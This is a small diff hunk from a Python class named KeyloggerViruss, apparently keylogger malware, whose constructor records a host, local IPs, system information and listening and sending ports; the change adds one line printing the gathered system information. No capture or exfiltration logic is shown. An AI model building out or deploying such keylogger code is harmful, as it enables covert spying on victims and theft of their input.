@@ -21,6 +21,7 @@ class KeyloggerViruss():
         self.host = host
         self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
         self.info_self = get_system_info(target_ip=IP)
+        print(self.info_self)
         self.port_listen = port_listen
         self.port_send = port_send
         self.FLAG_ACTIVE = False
